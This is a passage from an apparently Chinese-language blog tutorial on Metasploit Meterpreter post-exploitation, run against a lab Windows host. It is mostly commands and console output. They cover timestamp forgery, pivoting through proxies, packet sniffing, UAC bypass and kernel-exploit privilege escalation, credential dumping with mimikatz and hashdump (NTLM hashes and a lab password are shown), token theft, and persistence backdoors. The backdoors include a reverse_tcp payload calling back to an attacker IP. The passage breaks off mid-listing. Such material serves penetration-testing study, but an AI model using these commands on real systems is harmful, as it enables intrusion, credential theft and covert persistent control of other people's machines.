<h3 id="4-2-文件系统命令-5"><a href="#4-2-文件系统命令-5" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-5"><a href="#4-3-网络命令-5" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-5"><a href="#4-4-信息收集-5" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-5"><a href="#4-5-提权-5" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-5"><a href="#4-6-获取凭证-5" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-5"><a href="#4-7-假冒令牌-5" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

<h3 id="4-8-植入后门-5"><a href="#4-8-植入后门-5" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>

能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   